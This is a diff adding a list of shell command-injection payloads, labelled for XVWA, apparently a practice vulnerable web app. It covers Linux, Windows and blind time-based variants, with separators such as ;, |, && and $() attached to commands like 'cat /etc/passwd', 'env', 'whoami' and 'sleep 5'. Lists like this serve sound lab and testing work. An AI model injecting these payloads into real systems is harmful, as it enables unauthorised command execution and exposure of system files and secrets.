@@ -1,0 +1,116 @@
+# Command Injection payloads optimized for XVWA
+# Linux command injection payloads that work on XVWA
+; id
+| id
+& id
+&& id
+|| id
+`id`
+$(id)
+; whoami
+| whoami
+& whoami
+&& whoami
+|| whoami
+`whoami`
+$(whoami)
+; uname -a
+| uname -a
+& uname -a
+&& uname -a
+|| uname -a
+`uname -a`
+$(uname -a)
+; cat /etc/passwd
+| cat /etc/passwd
+& cat /etc/passwd
+&& cat /etc/passwd
+|| cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; ls -la
+| ls -la
+& ls -la
+&& ls -la
+|| ls -la
+`ls -la`
+$(ls -la)
+; ps aux
+| ps aux
+& ps aux
+&& ps aux
+|| ps aux
+`ps aux`
+$(ps aux)
+; pwd
+| pwd
+& pwd
+&& pwd
+|| pwd
+`pwd`
+$(pwd)
+; env
+| env
+& env
+&& env
+|| env
+`env`
+$(env)
+
+# Windows command injection payloads that work on XVWA
+& whoami
+&& whoami
+| whoami
+|| whoami
+; whoami
+& ver
+&& ver
+| ver
+|| ver
+; ver
+& dir
+&& dir
+| dir
+|| dir
+; dir
+& ipconfig
+&& ipconfig
+| ipconfig
+|| ipconfig
+; ipconfig
+& netstat -an
+&& netstat -an
+| netstat -an
+|| netstat -an
+; netstat -an
+& tasklist
+&& tasklist
+| tasklist
+|| tasklist
+; tasklist
+& systeminfo
+&& systeminfo
+| systeminfo
+|| systeminfo
+; systeminfo
+
+# Blind command injection payloads for XVWA
+; sleep 5
+| sleep 5
+& sleep 5
+&& sleep 5
+|| sleep 5
+`sleep 5`
+$(sleep 5)
+; ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+& ping -c 5 127.0.0.1
+&& ping -c 5 127.0.0.1
+|| ping -c 5 127.0.0.1
+`ping -c 5 127.0.0.1`
+$(ping -c 5 127.0.0.1)
+; ping -n 5 127.0.0.1
+| ping -n 5 127.0.0.1
+& ping -n 5 127.0.0.1
+&& ping -n 5 127.0.0.1
+|| ping -n 5 127.0.0.1
